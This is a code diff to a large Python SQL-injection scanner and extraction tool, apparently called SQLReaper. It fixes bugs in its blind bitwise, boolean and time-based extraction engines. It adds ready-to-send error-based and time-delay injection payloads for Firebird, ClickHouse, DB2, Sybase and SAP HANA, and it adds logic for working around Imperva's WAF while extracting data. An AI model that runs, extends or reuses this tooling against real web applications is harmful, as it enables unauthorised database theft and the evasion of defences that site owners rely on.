@@ -63181,6 +63181,21 @@ class Scanner:
                                   253,254,255,192,193,194,195,196,197,198,199,200,
                                   201,202,203,204,205,206,207,208,209,210,211,212,
                                   213,214,216,217,218,219,220,221,222,223,240,247]
+                # BUG-FALLBACK-EQ-MSSQL-ORACLE-RANGE FIX (MEDIUM, MSSQL/Oracle,
+                # equality-fallback character scan, all boolean-based techniques):
+                # The candidate range was hard-coded to 32-255 (Latin-1). MSSQL's
+                # UNICODE()/Sybase's UNICODE() and Oracle's ASCIISTR() both return the
+                # full BMP codepoint (0..65535). With a 32-255 ceiling, any BMP character
+                # (CJK, Arabic, Cyrillic, etc.) was never in the candidate list → the
+                # equality scan always returned None for non-Latin-1 characters → silent
+                # extraction failure. Fix: extend the scan tail to the DBMS-appropriate
+                # ceiling using the same DBMS→ceiling mapping as BitwiseExtractor/AFE.
+                _eq_char_ceil = (65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
+                                 else 1114111 if _dbms in (
+                                     "MySQL", "MariaDB", "TiDB",
+                                     "PostgreSQL", "CockroachDB", "YugabyteDB",
+                                     "SQLite", "Amazon Redshift", "ClickHouse")
+                                 else 255)
                 _order = (list(range(97, 123)) + list(range(65, 91)) +
                           list(range(48, 58)) + [95, 45, 46, 47, 64, 32] +
                           _latin1_common +
@@ -63188,7 +63203,9 @@ class Scanner:
                            if v not in range(97, 123) and v not in range(65, 91)
                            and v not in range(48, 58)
                            and v not in (95, 45, 46, 47, 64, 32)
-                           and v not in _latin1_common])
+                           and v not in _latin1_common] +
+                          # BUG-FALLBACK-EQ-MSSQL-ORACLE-RANGE: extend past 255 for wide-char DBMSes
+                          (list(range(256, _eq_char_ceil + 1)) if _eq_char_ceil > 255 else []))
                 # BUG-FALLBACK-EQUALITY-NONE-RESILIENCE FIX (CRITICAL):
                 # Root cause: On True=400 oracles (where the app legitimately returns 400
                 # for True SQL conditions), equality probes for the CORRECT candidate also
@@ -67949,7 +67966,17 @@ class Scanner:
                 _bw_len = 0
                 for _bl_bit in range(7, -1, -1):  # bits 7..0
                     _mask = 1 << _bl_bit
-                    _len_fn = f"LENGTH(({expr}))"
+                    # BUG-EXTRACT-BW-MSSQL-LENGTH-FN FIX (HIGH): LENGTH() is not valid on
+                    # MSSQL or Sybase — these use LEN() instead.  Using LENGTH() raises
+                    # "Invalid function name 'LENGTH'" on every bit-probe → oracle always
+                    # returns None → _bw_len stays 0 → extraction produces empty string.
+                    # Similarly, ClickHouse uses length() (lowercase only — case-sensitive).
+                    if _dbms in ("MSSQL", "Sybase"):
+                        _len_fn = f"LEN(({expr}))"
+                    elif _dbms == "ClickHouse":
+                        _len_fn = f"length(({expr}))"
+                    else:
+                        _len_fn = f"LENGTH(({expr}))"
                     # Use DBMS-specific bitwise AND for length detection.
                     # Oracle/DB2: & operator is invalid SQL — must use BITAND().
                     # Firebird: BIN_AND(). ClickHouse: bitAnd(). Others: &.
@@ -89499,10 +89526,24 @@ class BitwiseExtractor:
             LOG.debug(f"BitwiseExtractor: low confidence={agg_conf:.3f}  fallback")
             return await self._binary_search_fallback(char_func, dbms)
 
-        # Update confirmed_ascii state
-        if char_code > 0 and char_code < 128 and self._confirmed_ascii is None:
-            self._confirmed_ascii = True
-        elif char_code >= 128:
+        # BUG-BWE-CONFIRMED-ASCII-INTRASTRING FIX (MEDIUM): Setting _confirmed_ascii=True
+        # inside extract_char() caused intra-string state leakage.  When the first character
+        # in a string is ASCII (char_code < 128), subsequent characters in the SAME string
+        # used max_bits=7 (skipping bit 7) — meaning any later character with code ≥ 128
+        # (e.g. ©=0xA9, ë=0xEB, Chinese/emoji) was always decoded as its 7-bit truncated
+        # value (e.g. 0x29=')' instead of 0xA9='©').  The True assignment here competed with
+        # the `elif char_code >= 128: False` branch — whichever ran last won, but by the time
+        # a non-ASCII char triggered False, the damage for that character was already done
+        # (bit 7 was already skipped for the probe that produced the wrong char_code).
+        #
+        # Fix: NEVER set _confirmed_ascii=True inside extract_char().  Only set it to False
+        # when a non-ASCII char is positively identified (bit 7 was probed and set → expand
+        # back to 8-bit for remaining chars in this string).  The None→True optimization is
+        # safe ONLY inter-string (between separate extract_string() calls), and the reset in
+        # extract_string() already handles that by resetting to None before each new string.
+        # Within a single string, leave _confirmed_ascii as None (undetermined) until a
+        # non-ASCII char forces it to False.
+        if char_code >= 128:
             self._confirmed_ascii = False
 
         if 1 <= char_code <= 255:
@@ -98750,13 +98791,26 @@ class MLWAFFingerprinter:
             if 'imperva' in k.lower() or 'incapsula' in k.lower()
         )
         _imperva_is_winner = ('imperva' in _best_waf.lower() or 'incapsula' in _best_waf.lower())
-        if _imperva_vote_count >= 2 and not _imperva_is_winner:
+        # BUG-IMPERVA-FLAG-CLEAR FIX (CRITICAL): The original else branch set
+        # _IMPERVA_MINORITY_ACTIVE = False in TWO situations:
+        #   1. Imperva received fewer than 2 votes (correct: flag should be False)
+        #   2. Imperva received ≥2 votes AND is the plurality winner (_imperva_is_winner=True)
+        # Case 2 was WRONG: when Imperva is the confirmed winner the threat of data-aware
+        # blocking is even stronger than when it is a minority vote.  The else branch
+        # explicitly cleared the flag in the worst case, disabling the bitwise pre-arm
+        # guard at _bitwise_oracle_sane (line ~63414) so native bitwise extraction started
+        # against an Imperva target → Imperva's data-aware WAF blocked real-data probes
+        # → extracted characters were garbage.
+        # Fix: arm the flag whenever ≥2 votes for Imperva regardless of who won plurality.
+        if _imperva_vote_count >= 2:
             _IMPERVA_MINORITY_ACTIVE = True
+            _winner_note = ("plurality winner" if _imperva_is_winner
+                            else f"minority (winner={_best_waf})")
             LOG.warning(
-                "ML WAF: Imperva minority vote (%d/%d probes; winner=%s). "
+                "ML WAF: Imperva %s (%d/%d probes). "
                 "Pre-arming data-aware WAF extraction guard — native bitwise "
                 "(&mask=mask) will be skipped in favour of MOD-based extraction.",
-                _imperva_vote_count, _n_probes_ok, _best_waf)
+                _winner_note, _imperva_vote_count, _n_probes_ok)
         else:
             _IMPERVA_MINORITY_ACTIVE = False
         return _best_waf, confidence
@@ -99175,9 +99229,9 @@ class ZKBooleanExtractor:
         payload = apply_sql_noise(payload, self._probe_count)
         t0 = time.monotonic()
         try:
-            await _send_injected(self.engine, self.method, self.url, self.data,
-                                  self.data_fmt, self.result.param,
-                                  self.original + payload, self.tamper_chain)
+            _tp_resp = await _send_injected(self.engine, self.method, self.url, self.data,
+                                             self.data_fmt, self.result.param,
+                                             self.original + payload, self.tamper_chain)
         except Exception:
             # Return 0 not elapsed: exception duration (e.g. 15s timeout) >> threshold
             # would make every failed probe appear True, corrupting extracted chars.
@@ -99185,6 +99239,19 @@ class ZKBooleanExtractor:
             return 0.0
 
         self._requests += 1
+        # BUG-ZKB-TIME-PROBE-STATUS FIX (MEDIUM): _time_probe measured wall-clock elapsed
+        # but never checked the HTTP status code.  A WAF rate-limit (HTTP 429) or a CDN
+        # that generates a slow error page produces a response time >= _mad_threshold even
+        # though no SQL sleep occurred → ask() returns True → false-positive oracle decision.
+        # Fix: treat non-2xx responses (except known oracle-4xx targets) as 0ms so rate-
+        # limited probes never satisfy the timing threshold.
+        try:
+            _tp_status = _get_safe_status_code(_tp_resp) if _tp_resp is not None else 0
+            if _tp_status != 0 and _tp_status not in (200, 201, 204, 206):
+                # On rate-limit (429) or server error (5xx), elapsed time is not SQL-driven
+                return 0.0
+        except Exception:
+            pass
         return (time.monotonic() - t0) * 1000
 
     #  Boolean oracle 
@@ -99545,6 +99612,12 @@ class ZKBooleanExtractor:
                            "ELSE 0 END FROM (SELECT SUBSTR(({query}),{pos},1) c__ FROM DUAL))"),
             "SQLite":     "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
             "Firebird":   "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+            # BUG-ZKB-CLICKHOUSE-CHARFN FIX (LOW): ClickHouse was absent → fell to generic
+            # "ASCII(SUBSTRING(({query}),{pos},1))" (uppercase). ClickHouse function names
+            # are case-sensitive: uppercase ASCII/SUBSTRING are unknown functions → SQL error
+            # on every binary-search probe → all chars return None → extraction fails.
+            # Fix: use lowercase ClickHouse-native function names.
+            "ClickHouse": "coalesce(ascii(substring(({query}),{pos},1)),0)",
         }.get(dbms, "ASCII(SUBSTRING(({query}),{pos},1))")
         char_fn_tmpl = self.queries.get("char_func", _zk_default_charfn)
         # BUG-ZK-CHAR-HI-MYSQL-SQLITE-PG FIX (part 2/2 — _zk_char_hi):
@@ -116127,6 +116200,71 @@ class TechniqueCascadeEngine:
                     (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
                     (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
                 ]
+            # BUG-CHECKC-MISSING-DBMS FIX (CRITICAL): Firebird, ClickHouse, DB2, Sybase,
+            # and SAP_HANA were absent → all fell to the MySQL else branch below which sends
+            # EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) — a MySQL-specific XML function that
+            # does not exist in any of these 5 DBMSes.  Both the canary SQL and the error
+            # patterns produced guaranteed SQL syntax errors (not semantic DB errors), making
+            # Check C ALWAYS fail for error-based injection on these targets.
+            elif dbms == "Firebird":
+                # Firebird error triggers: CAST to incompatible type → "string truncation" error.
+                # Non-existent table → "Table unknown" error.  Firebird does not support
+                # EXTRACTVALUE/UPDATEXML (MySQL XML functions).
+                _c_fallbacks = [
+                    ("' AND CAST('abc' AS INTEGER)=0-- -", "CAST"),
+                    (" AND CAST('abc' AS INTEGER)=0-- -", "CAST-num"),
+                    ("' AND (SELECT 1 FROM RDB$DATABASE WHERE 'abc'=CAST('abc' AS INTEGER))=1-- -", "CAST-subq"),
+                    (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
+                    (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
+                ]
+            elif dbms == "ClickHouse":
+                # ClickHouse error triggers: toInt32() on non-numeric string raises
+                # "Cannot parse string 'abc' as Int32" (DB::Exception).
+                # 1/0 raises "Division by zero" in ClickHouse.
+                # Non-existent table raises "Table ... doesn't exist".
+                # ClickHouse function names are case-sensitive — use lowercase.
+                _c_fallbacks = [
+                    ("' AND toInt32('abc')=0-- -", "toInt32"),
+                    (" AND toInt32('abc')=0-- -", "toInt32-num"),
+                    ("' AND 1/0=0-- -", "division"),
+                    (" AND 1/0=0-- -", "division-num"),
+                    (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
+                    (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
+                ]
+            elif dbms == "DB2":
+                # DB2 error triggers: CAST('abc' AS INTEGER) → SQL0420N "invalid numeric value".
+                # 1/0 → SQL0801N "Division by zero."
+                # Non-existent table → SQL0204N "is an undefined name."
+                _c_fallbacks = [
+                    ("' AND CAST('abc' AS INTEGER)=0-- -", "CAST"),
+                    (" AND CAST('abc' AS INTEGER)=0-- -", "CAST-num"),
+                    ("' AND 1/0=0-- -", "division"),
+                    (" AND 1/0=0-- -", "division-num"),
+                    (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
+                    (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
+                ]
+            elif dbms == "Sybase":
+                # Sybase (SAP ASE) error triggers: CAST('abc' AS INT) → "Conversion failed".
+                # 1/0 → "Divide by zero occurred." (Sybase ASE specific message).
+                _c_fallbacks = [
+                    ("' AND CAST('abc' AS INT)=0-- -", "CAST"),
+                    (" AND CAST('abc' AS INT)=0-- -", "CAST-num"),
+                    ("' AND 1/0=0-- -", "division"),
+                    (" AND 1/0=0-- -", "division-num"),
+                    (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
+                    (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
+                ]
+            elif dbms == "SAP_HANA":
+                # SAP HANA error triggers: CAST('abc' AS INTEGER) → "invalid number".
+                # 1/0 → "division by zero is undefined" (SAP HANA-specific message).
+                _c_fallbacks = [
+                    ("' AND CAST('abc' AS INTEGER)=0-- -", "CAST"),
+                    (" AND CAST('abc' AS INTEGER)=0-- -", "CAST-num"),
+                    ("' AND 1/0=0-- -", "division"),
+                    (" AND 1/0=0-- -", "division-num"),
+                    (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
+                    (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
+                ]
             else:  # MySQL and other MySQL-compatible engines
                 # BUG-MYSQL-CHECKC-DIV-DEADCODE-FIX: MySQL 1/0 evaluates to NULL (not an error).
                 # `AND 1/0` = `AND NULL` = false condition; MySQL never raises a division error
@@ -116327,6 +116465,75 @@ class TechniqueCascadeEngine:
                     "division by zero", "syntax error at or near", "invalid input syntax for type",
                     "relation does not exist", "column does not exist",
                 ],
+                # BUG-CHECKC-MISSING-DBMS FIX (CRITICAL): Firebird, ClickHouse, DB2, Sybase, and
+                # SAP_HANA were missing from _err_patterns → Check C always failed to match any
+                # error strings for these DBMSes → every error-based canary returned 0 evidence
+                # points → false-negative confirmation or wrong DBMS path fallthrough.
+                "Firebird": [
+                    # Firebird exception codes and SQL state strings
+                    "gds exception", "arithmetic exception", "string to integer conversion error",
+                    "table unknown", "dynamic sql error", "isc_", "335544",
+                    # Firebird table-not-found from nonexistent table canary
+                    "table unknown", "object not found", "does not exist",
+                    # Firebird CAST('abc' AS INTEGER) error
+                    "conversion error from string", "conversion error",
+                    # Firebird JDBC driver prefix
+                    "org.firebirdsql", "firebird sql exception", "firebird",
+                    # Firebird SQLCODE values that appear in error strings
+                    "sqlcode: -204", "sqlcode: -303", "sqlcode: -413",
+                ],
+                "ClickHouse": [
+                    # ClickHouse error format: "DB::Exception: ..."
+                    "db::exception", "code: ",
+                    # ClickHouse type-conversion canary (toInt32('abc'))
+                    "cannot parse string", "cannot parse number",
+                    "exception: cannot parse string",
+                    # ClickHouse table-not-found from nonexistent table canary
+                    "doesn't exist", "unknown table", "no such table",
+                    # ClickHouse function errors
+                    "unknown function", "no matching function",
+                    # ClickHouse division by zero (1/0)
+                    "division by zero", "zero division",
+                    # ClickHouse driver/JDBC strings
+                    "com.clickhouse", "clickhouse.client",
+                ],
+                "DB2": [
+                    # DB2 SQLCODE and SQLSTATE codes appear inline in error messages
+                    "sqlcode=", "sqlstate=", "sql0", "db2",
+                    # DB2 CAST('abc' AS INTEGER) or 1/0 error codes
+                    "sql0420n", "sql0801n", "sql0811n",
+                    # DB2 table-not-found
+                    "sql0204n", "sql0206n", "sql0727n",
+                    # DB2 JDBC driver prefixes
+                    "ibm", "com.ibm.db2", "db2 sql error",
+                    # DB2 syntax errors
+                    "sql0104n", "sql0199n",
+                ],
+                "Sybase": [
+                    # Sybase ASE error messages
+                    "divide by zero occurred", "division by zero",
+                    # Sybase CAST type error
+                    "conversion failed", "explicit conversion from datatype",
+                    # Sybase 'msg' prefix on ASE errors (e.g. "msg 8134")
+                    "msg 8134", "msg 156", "msg 102", "sybase",
+                    # Sybase table-not-found
+                    "invalid object name",
+                    # Sybase JDBC driver
+                    "com.sybase.jdbc", "net.sourceforge.jtds",
+                ],
+                "SAP_HANA": [
+                    # SAP HANA error message strings
+                    "sap hana", "hana",
+                    # SAP HANA ODBC/JDBC driver prefixes
+                    "hdbodbc", "com.sap.db4j", "sapdb",
+                    # SAP HANA CAST('abc' AS INTEGER) and division errors
+                    "division by zero undefined", "division by zero",
+                    "invalid number", "not a numeric value",
+                    # SAP HANA SQL error codes (260=table not found, 7=feature not supported)
+                    "[260]", "table not found",
+                    # SAP HANA syntax errors
+                    "sql syntax error", "syntax error",
+                ],
             # FIX-CHECKC-UNKNOWN-DBMS: the old fallback contained only MySQL-format patterns.
             # When dbms="" (timing-first detection fires before DBMS fingerprinting),
             # Check C sends MySQL error canaries to MSSQL/PostgreSQL/Oracle/SQLite targets
@@ -116359,11 +116566,33 @@ class TechniqueCascadeEngine:
                 _cfp, _, _c_status, _ = await _pcv_send(_cp)
                 if _validate_response(_cfp, "response_body_check"):
                     _cbody = _safe_decode_body(_cfp, encoding="utf-8", errors="replace", func_name="extraction").lower()
-                    
+
                     if _c_status in (400, 500, 502, 503) and _bl_status not in (400, 500, 502, 503):
                         _any_status_500 = True
                         _status_500_count += 1
-                    
+
+                    # BUG-CHECKC-NO-WAF-DETECTION FIX (MEDIUM, all DBMSes on WAF-protected
+                    # targets, Check C error canary loop):
+                    # When a WAF blocks an error-triggering payload (returning 403 with WAF
+                    # body patterns), the original code skipped WAF-block detection entirely.
+                    # Asymmetric WAF blocking — error payload → WAF block (403/406), clean
+                    # baseline → 200 — is itself a positive injection signal: the WAF fired
+                    # because the SQL expression was valid enough to trigger its SQL-injection
+                    # detection rules. Fix: detect WAF-blocked error canary responses (using
+                    # WAFBlockDiscriminator.is_waf_block) and synthesise a pseudo-match
+                    # "waf_block_detected" to supply the HTTP-status boost path.  Only fires
+                    # when the baseline was NOT already WAF-blocked (asymmetric condition).
+                    _c_is_waf = (
+                        _c_status in WAFBlockDiscriminator.WAF_BLOCK_CODES
+                        and WAFBlockDiscriminator.is_waf_block(_cfp)
+                        and _bl_status not in WAFBlockDiscriminator.WAF_BLOCK_CODES
+                    )
+                    if _c_is_waf:
+                        _any_status_500 = True  # reuse boost path for WAF signal
+                        _status_500_count += 1
+                        _all_c_matches.append((_c_name, "waf_block_detected", _c_status))
+                        continue  # no body error patterns to match on a WAF page
+
                     # Baseline subtraction + context check (first 3000 bytes)
                     _new_matches = []
                     for p in _err_patterns:
@@ -116371,7 +116600,7 @@ class TechniqueCascadeEngine:
                             _pos = _cbody.find(p)
                             if _pos < 3000:
                                 _new_matches.append(p)
-                    
+
                     if _new_matches:
                         _all_c_matches.append((_c_name, _new_matches[0], _c_status))
             
@@ -116421,7 +116650,11 @@ class TechniqueCascadeEngine:
                 _canary_p = " CANARY_SQLREAPER_RANDOM_9x7z"
                 try:
                     _can_fp, _, _can_status, _ = await _pcv_send(_canary_p)
-                    if _can_status in (400, 500):
+                    # BUG-CHECKC-STATUS-GATE-502 FIX: Only 400/500 were checked; 502/503
+                    # responses from a WAF or upstream server also indicate the canary
+                    # (non-SQL garbage payload) alone triggers the error gate, meaning
+                    # the error is from parameter validation, NOT SQL injection.
+                    if _can_status in (400, 500, 502, 503):
                         print(f"[*]     Check C HTTP-{_can_status} REJECTED: canary (non-SQL)"
                               f" also caused {_can_status} → parameter validation failure (e.g."
                               " __VIEWSTATE MAC), NOT SQL injection", flush=True)
@@ -117003,7 +117236,15 @@ class TechniqueCascadeEngine:
                     # result set above. The OR ensures status-oracle detection (which already
                     # appended to _d_headers and set _d_pass=True) is not overwritten by
                     # the header-diff-only formula below.
+                    # BUG-CHECKD-PASS-REASSIGNMENT FIX (CRITICAL): The WAF oracle branches
+                    # above (elif _d_status_waf_oracle / _d_status_waf_oracle_reversed) each set
+                    # _d_pass = True and appended to _d_headers, but this formula then reassigned
+                    # _d_pass using only the plain status oracle flags — wiping out the WAF oracle
+                    # True that was just written.  Any true/false probe pair where the WAF blocks
+                    # exactly the injection-true probe (or exactly the injection-false probe) was
+                    # reported as FAIL regardless of the WAF oracle evidence above.
                     _d_pass = (_d_status_oracle or _d_status_oracle_reversed or
+                               _d_status_waf_oracle or _d_status_waf_oracle_reversed or
                                len(_security_diffs) >= 1 or
                                len(_dynamic_diffs) >= 2)  # RC3-FP
                     # FIX-BUG-CHECKD-INDENT: moved _details["D"] and print inside the
@@ -117245,6 +117486,15 @@ class TechniqueCascadeEngine:
                         # → _e_direct_sim ≈ 0 → Check E always fails for genuine ClickHouse
                         # injection.  Use lowercase ClickHouse-native function names.
                         "ClickHouse": " AND substring('SQLReaper',1,1)='S' AND length('SQLReaper')=9 AND upper('a')='A'-- -",
+                        # BUG-CHECKE-MISSING-DBMS FIX: Firebird and DB2 were absent from both
+                        # payloads dicts → fell through to PostgreSQL ANSI default which uses
+                        # SUBSTRING() — valid SQL but not DBMS-specific enough to distinguish
+                        # Firebird/DB2 execution from a generic reflection.  Using native
+                        # functions (SUBSTR for Firebird, SUBSTR for DB2) produces a stronger
+                        # DBMS-consistency signal without the risk of syntax errors from SUBSTRING.
+                        "Firebird":   " AND SUBSTR('SQLReaper',1,1)='S' AND CHARACTER_LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "DB2":        " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "SAP_HANA":   " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                     }
                 else:
                     payloads = {
@@ -117263,6 +117513,10 @@ class TechniqueCascadeEngine:
                         "SQLite":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         # BUG-V217-CHECKE-CLICKHOUSE-CASE FIX: see numeric_ctx branch above.
                         "ClickHouse": "' AND substring('SQLReaper',1,1)='S' AND length('SQLReaper')=9 AND upper('a')='A'-- -",
+                        # BUG-CHECKE-MISSING-DBMS FIX: see numeric_ctx branch above.
+                        "Firebird":   "' AND SUBSTR('SQLReaper',1,1)='S' AND CHARACTER_LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "DB2":        "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "SAP_HANA":   "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                     }
                 # BUG-CHECK-E-UNKNOWN-DBMS FIX: MySQL probe includes BENCHMARK() which
                 # is MySQL-specific; using it as the default causes a syntax error on
@@ -119350,6 +119604,65 @@ class TechniqueCascadeEngine:
                 (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
                  " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
             ],
+            # BUG-CHECKB-MISSING-DBMS FIX (HIGH): Firebird and ClickHouse were absent from
+            # _b_fallbacks_by_dbms → fell through to the else-branch (all-DBMS merge), which
+            # includes Oracle DBMS_PIPE, MySQL IF/SLEEP, MSSQL WAITFOR, and SQLite RANDOMBLOB
+            # canaries that cause SQL errors on Firebird/ClickHouse → both true AND false probes
+            # error out → timing gap = 0 → Check B ALWAYS rejected all Firebird/ClickHouse timing
+            # confirmations as false positives.
+            #
+            # Firebird: no native SLEEP() function; use a heavy-query cross-join on RDB$FIELDS
+            # (Firebird system catalog table, typically 300-800 rows → cross-join = ~100K-640K rows).
+            # CASE WHEN short-circuits: true branch executes full cross-join, false branch returns
+            # 0 immediately — gives a clear timing gap.  SUBSTRING syntax: SQL-standard FROM/FOR.
+            #
+            # ClickHouse: has sleep(n) returning 0 (UInt8); use CASE WHEN to conditionally delay.
+            # ClickHouse is case-sensitive for function names — must use lowercase sleep/substring.
+            "Firebird": [
+                # ── String-context (quote + AND-form) ────────────────────────
+                ("' AND (SELECT CASE WHEN SUBSTRING('SQLReaper' FROM 1 FOR 1)='S' THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -",
+                 "' AND (SELECT CASE WHEN SUBSTRING('SQLReaper' FROM 1 FOR 1)='X' THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -", "SUBSTR+RDBFIELDS_HQ"),
+                ("' AND (SELECT CASE WHEN 7*13=91 THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -",
+                 "' AND (SELECT CASE WHEN 7*13=92 THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -", "arithmetic+RDBFIELDS_HQ"),
+                # ── Numeric-context (no leading quote) ────────────────────────
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper' FROM 1 FOR 1)='S' THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper' FROM 1 FOR 1)='X' THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -", "SUBSTR+RDBFIELDS_HQ(numeric)"),
+                (" AND (SELECT CASE WHEN 7*13=91 THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -",
+                 " AND (SELECT CASE WHEN 7*13=92 THEN "
+                 "(SELECT COUNT(*) FROM RDB$FIELDS A, RDB$FIELDS B, RDB$FIELDS C) ELSE 0 END "
+                 "FROM RDB$DATABASE)>=0-- -", "arithmetic+RDBFIELDS_HQ(numeric)"),
+            ],
+            "ClickHouse": [
+                # ── String-context (quote + AND-form) ────────────────────────
+                # sleep(n) returns 0 (UInt8); CASE WHEN short-circuits — true branch delays n s.
+                # ClickHouse requires lowercase function names; uppercase variants raise errors.
+                (f"' AND (CASE WHEN substring('SQLReaper',1,1)='S' THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -",
+                 f"' AND (CASE WHEN substring('SQLReaper',1,1)='X' THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -", "substring+sleep"),
+                (f"' AND (CASE WHEN 7*13=91 THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -",
+                 f"' AND (CASE WHEN 7*13=92 THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -", "arithmetic+sleep"),
+                # ── Numeric-context (no leading quote) ────────────────────────
+                (f" AND (CASE WHEN substring('SQLReaper',1,1)='S' THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -",
+                 f" AND (CASE WHEN substring('SQLReaper',1,1)='X' THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -", "substring+sleep(numeric)"),
+                (f" AND (CASE WHEN 7*13=91 THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -",
+                 f" AND (CASE WHEN 7*13=92 THEN sleep({_sleep_sec_int}) ELSE 0 END)=0-- -", "arithmetic+sleep(numeric)"),
+                # ── Stacked ('; SELECT ...) — ClickHouse supports stacked via HTTP API ─
+                (f"'; SELECT sleep(CASE WHEN substring('SQLReaper',1,1)='S' THEN {_sleep_sec_int} ELSE 0 END)-- -",
+                 f"'; SELECT sleep(CASE WHEN substring('SQLReaper',1,1)='X' THEN {_sleep_sec_int} ELSE 0 END)-- -", "STACKED+substring+sleep"),
+            ],
         }
         # Prepend derived timing payloads
         _derived_timing = self._derive_timing_payloads(payload, dbms, _sleep_sec)
@@ -119592,9 +119905,19 @@ class TechniqueCascadeEngine:
             # BUG-CHECKB-CALIBRATED-THRESHOLD FIX (part 2): override static fraction
             # with IQR-calibrated value from detect_time() when available.
             if _pcv_cal_thresh_cb is not None:
-                # _pcv_cal_thresh_cb is already the minimum ms the true probe must show.
+                # BUG-CHECKB-WAITFOR-CALIBRATED FIX: The WAITFOR truncation above recomputed
+                # _true_needed using _canary_sleep_ms_eff (the actual WAITFOR delay, e.g. 1000ms).
+                # Without this guard, max(_true_needed, _pcv_cal_thresh_cb) would restore the
+                # calibrated threshold (e.g. 1500ms from a detection with sleep=1.5s), requiring
+                # the WAITFOR canary to produce 1500ms — impossible since it only sleeps 1000ms.
+                # Fix: when the calibrated threshold exceeds 90% of the effective canary sleep
+                # duration, cap it at 85% of _canary_sleep_ms_eff so the threshold is achievable.
+                _cal_thresh_for_this_pair = _pcv_cal_thresh_cb
+                if _canary_sleep_ms_eff < _sleep_ms and _pcv_cal_thresh_cb > _canary_sleep_ms_eff * 0.90:
+                    _cal_thresh_for_this_pair = _canary_sleep_ms_eff * 0.85
+                # _pcv_cal_thresh_cb is the minimum ms the true probe must show.
                 # Ensure it is at least as strict as the static formula (take the max).
-                _true_needed = max(_true_needed, _pcv_cal_thresh_cb)
+                _true_needed = max(_true_needed, _cal_thresh_for_this_pair)
             # BUG-3B FIX: Old formula `min(_sleep_ms * 0.35, _bl_mean_cb + _bl_std_cb * 2.0)`
             # was WRONG — the min() caused the threshold to cap at 350ms (for sleep_ms=1000)
             # even on high-latency servers where baseline is 2000ms.  A false probe returning
@@ -141257,11 +141580,19 @@ class SafeModeVerifier:
                 except Exception:
                     pass
 
+                # BUG-SAFEMODE-DEAD-BRANCH FIX: The original `diff_capable and timing_capable`
+                # branch assigned DIFFERENTIAL — same as `diff_capable` alone — making the
+                # combined-capability branch dead code with no functional distinction.
+                # Fix: when BOTH differential body signals AND timing signals are proven behind
+                # the WAF, escalate to FULL mode.  Having both oracles confirmed means the
+                # backend processes SQL injection normally despite the WAF challenge on the
+                # clean entry page — identical to a FULL oracle target.  Pure diff-only keeps
+                # DIFFERENTIAL; pure timing-only keeps TIMING_ONLY (unchanged).
                 if diff_capable and timing_capable:
-                    oracle_mode = OracleMode.DIFFERENTIAL
+                    oracle_mode = OracleMode.FULL
                     can_scan    = True
                     warnings.append(
-                        "403/WAF  DIFFERENTIAL oracle + timing confirmed")
